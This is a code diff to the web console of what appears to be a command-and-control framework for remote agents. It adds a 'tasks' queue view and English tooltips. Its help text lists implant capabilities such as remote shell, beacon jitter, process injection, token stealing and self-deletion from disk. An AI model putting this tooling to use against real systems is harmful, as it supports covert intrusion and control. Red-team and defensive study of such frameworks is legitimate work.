@@ -620,12 +620,12 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
             <span id="console-lang-en" onclick="setHelpLang('en',activeAgent?.id)" style="padding:1px 6px;border-radius:3px;border:1px solid var(--border);font-size:10px;cursor:pointer;transition:all .15s">EN</span>
             <span id="console-lang-es" onclick="setHelpLang('es',activeAgent?.id)" style="padding:1px 6px;border-radius:3px;border:1px solid var(--border);font-size:10px;cursor:pointer;transition:all .15s">ES</span>
           </span>
-          <button id="console-max-btn" onclick="toggleConsoleMaximize()" title="Maximizar consola (doble-click pestaña · Meta+Enter)" style="flex-shrink:0;background:transparent;color:var(--text3);border:none;border-left:1px solid var(--border);padding:0 12px;cursor:pointer;font-size:15px;line-height:1">⤢</button>
-          <button id="console-dock-btn" onclick="toggleConsoleDock()" title="Dock to right" style="flex-shrink:0;background:transparent;color:var(--text3);border:none;border-left:1px solid var(--border);padding:0 12px;cursor:pointer;font-size:13px;line-height:1">⊢</button>
+          <button id="console-max-btn" tabindex="-1" onclick="toggleConsoleMaximize()" title="Maximize console (double-click tab · Meta+Enter)" style="flex-shrink:0;background:transparent;color:var(--text3);border:none;border-left:1px solid var(--border);padding:0 12px;cursor:pointer;font-size:15px;line-height:1">⤢</button>
+          <button id="console-dock-btn" tabindex="-1" onclick="toggleConsoleDock()" title="Dock to right" style="flex-shrink:0;background:transparent;color:var(--text3);border:none;border-left:1px solid var(--border);padding:0 12px;cursor:pointer;font-size:13px;line-height:1">⊢</button>
         </div>
         <!-- Console view -->
-        <div id="console-view" style="display:flex;flex-direction:column;flex:1;min-height:0">
-          <div id="console-output"></div>
+        <div id="console-view" style="display:flex;flex-direction:column;flex:1;min-height:0" onclick="if(event.target===this||event.target.id==='console-output'){document.getElementById('console-input').focus()}">
+          <div id="console-output" onclick="document.getElementById('console-input').focus()"></div>
           <div style="position:relative">
             <div id="console-ac"></div>
             <div id="console-input-row">
@@ -7094,7 +7094,7 @@ function toggleConsoleMaximize() {
   // Clear any inline height set by the drag handle — it overrides CSS classes
   pane.style.height = '';
   const btn = document.getElementById('console-max-btn');
-  if (btn) { btn.textContent = isMax ? '⤡' : '⤢'; btn.style.color = isMax ? 'var(--accent)' : 'var(--text3)'; btn.title = isMax ? 'Restaurar consola (doble-click pestaña · Meta+Enter)' : 'Maximizar consola (doble-click pestaña · Meta+Enter)'; }
+  if (btn) { btn.textContent = isMax ? '⤡' : '⤢'; btn.style.color = isMax ? 'var(--accent)' : 'var(--text3)'; btn.title = isMax ? 'Restore console (double-click tab · Meta+Enter)' : 'Maximize console (double-click tab · Meta+Enter)'; }
   const out = document.getElementById('console-output');
   if (out) requestAnimationFrame(() => { out.scrollTop = out.scrollHeight; });
 }
@@ -7260,6 +7260,7 @@ const AC_COMMANDS = [
   ['shell','shell <cmd>'],
   ['sleep','sleep <sec> <jitter%>'],
   ['results','results [n]'],
+  ['tasks','tasks [n] — ver cola de tareas'],
   ['cleanup','auto-eliminar del sistema'],
   ['back','cerrar consola'],
   ['kill','terminar proceso del agente'],
@@ -7715,6 +7716,7 @@ function getHelpHTML_en(isWin) {
   shell &lt;cmd&gt;                        execute shell command
   sleep &lt;sec&gt; &lt;jitter%&gt;              change beacon interval
   results [n]                        task result history (default 20)
+  tasks [n]                          task queue — pending, fetched, done (default 20)
   cleanup                            self-delete from disk
   back                               close console
   kill                               terminate agent process
@@ -7850,6 +7852,7 @@ function getHelpHTML_es(isWin) {
   shell &lt;cmd&gt;                        ejecutar comando shell
   sleep &lt;seg&gt; &lt;jitter%&gt;              cambiar beacon
   results [n]                        historial de resultados (defecto 20)
+  tasks [n]                          cola de tareas — pending, fetched, done (defecto 20)
   cleanup                            auto-eliminar del sistema
   back                               cerrar consola
   kill                               terminar proceso del agente
@@ -8738,6 +8741,19 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   results 5       → últimos 5 resultados
   results 100     → últimos 100 resultados`,
 
+  'tasks': `<b>tasks</b> — ver cola de tareas del agente
+
+  <span class="console-section">USO</span>
+  tasks [n]
+
+  <span class="console-section">EJEMPLOS</span>
+  tasks           → últimas 20 tareas (pending + fetched + done)
+  tasks 50        → últimas 50 tareas
+
+  <span class="console-section">NOTAS</span>
+  • Muestra ID, estado, tipo y argumentos de cada tarea
+  • Estado: pending = en cola · fetched = recogida por el agente · done = completada`,
+
   'back': `<b>back</b> — cerrar la consola del agente
 
   <span class="console-section">USO</span>
@@ -9526,6 +9542,19 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   results 5       → last 5 results
   results 100     → last 100 results`,
 
+  'tasks': `<b>tasks</b> — view agent task queue
+
+  <span class="console-section">USAGE</span>
+  tasks [n]
+
+  <span class="console-section">EXAMPLES</span>
+  tasks           → last 20 tasks (pending + fetched + done)
+  tasks 50        → last 50 tasks
+
+  <span class="console-section">NOTES</span>
+  • Shows ID, status, type and args for each task
+  • Status: pending = queued · fetched = picked up by agent · done = complete`,
+
   'back': `<b>back</b> — close the agent console
 
   <span class="console-section">USAGE</span>
@@ -9656,6 +9685,22 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
             res.error || '', null);
         });
       } else { addConsoleOutput('[*] no results', '', null); }
+    } catch(e) { addConsoleOutput('', e.message, null); }
+    return;
+  }
+
+  if (cmd === 'tasks') {
+    const limit = parseInt(args) || 20;
+    try {
+      const r = await api('GET', `/api/agents/${agentID}/tasks?limit=${limit}`);
+      if (r.ok && r.data && r.data.length) {
+        const hdr = 'ID      STATUS    TYPE                ARGS';
+        const rows = r.data.map(t => {
+          const truncArgs = (t.args||'').substring(0,40).replace(/\n/g,' ');
+          return `${String(t.id).padEnd(8)}${(t.status||'').padEnd(10)}${(t.type||'').padEnd(20)}${truncArgs}`;
+        });
+        addConsoleOutput([hdr, ...rows].join('\n'), '', null);
+      } else { addConsoleOutput('[*] no tasks', '', null); }
     } catch(e) { addConsoleOutput('', e.message, null); }
     return;
   }
